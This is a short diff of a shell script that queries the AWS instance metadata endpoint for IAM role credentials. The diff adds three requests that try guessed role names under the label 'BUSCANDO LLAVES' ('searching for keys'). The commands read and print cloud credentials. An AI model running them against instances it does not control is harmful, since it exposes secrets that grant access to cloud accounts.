@@ -16,4 +16,10 @@ ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/late
 echo "Rol encontrado: $ROLE"
 
 echo "--- BUSCANDO LLAVES ---"
-curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/iam-id
+
+echo "--- BUSCANDO LLAVES 2 ---"
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/id-iam
+
+echo "--- BUSCANDO LLAVES 3 ---"
+curl -s -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/iam
